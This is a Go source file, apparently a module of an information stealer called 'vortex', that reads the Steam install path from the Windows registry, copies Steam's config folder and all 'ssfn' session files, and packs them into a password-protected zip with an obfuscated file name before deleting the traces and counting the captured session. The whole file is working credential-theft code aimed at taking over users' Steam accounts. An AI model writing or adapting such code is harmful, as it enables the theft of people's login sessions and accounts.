//go:build windows

package softwares

import (
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"vortex/encrypt"
	"vortex/hutil"

	"golang.org/x/sys/windows/registry"
)

func getSteamPath() string {

	steamKey, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Valve\\Steam", registry.QUERY_VALUE)
	if err == registry.ErrNotExist {
		return ""
	}

	steamPath, _, err := steamKey.GetStringValue("SteamPath")

	if _, err := os.Stat(steamPath); !os.IsNotExist(err) {
		return steamPath
	}

	return ""
}

func SteamDataDump(mainFolder string) error {

	steamPath := getSteamPath()
	steamDumpPath := filepath.Join(mainFolder, "steam-files")
	steamDumpConfig := filepath.Join(steamDumpPath, "config")
	if steamPath != "" {
		if err := hutil.CopyFolder(filepath.Join(steamPath, "config"), steamDumpConfig); err != nil {
			return err
		}
		_ = filepath.Walk(steamPath, func(path string, info fs.FileInfo, err error) error {
			if strings.Contains(filepath.Base(path), "ssfn") {
				if err = hutil.CopyFile(path, filepath.Join(steamDumpPath, filepath.Base(path))); err != nil {
					return err
				}
			}
			return nil
		})

		if err := hutil.ZipFolder(filepath.Base(steamDumpPath), steamDumpPath, filepath.Join(mainFolder, encrypt.B64Util("steam-dump.zip", 0)), "XX"); err != nil {
			return err
		}
		if err := os.RemoveAll(steamDumpPath); err != nil {
			return err
		}

		hutil.Sessions++
	}

	return nil
}
